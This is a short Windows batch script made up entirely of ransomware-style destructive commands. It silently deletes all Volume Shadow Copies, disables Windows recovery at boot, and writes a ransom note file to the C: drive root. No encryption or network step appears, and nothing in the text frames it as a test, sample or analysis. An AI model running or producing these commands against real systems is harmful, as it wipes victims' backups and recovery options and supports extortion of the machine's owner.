@echo off
vssadmin.exe Delete Shadows /All /Quiet
bcdedit /set {default} recoveryenabled No
echo "System compromised" > C:\ransom_note.txt
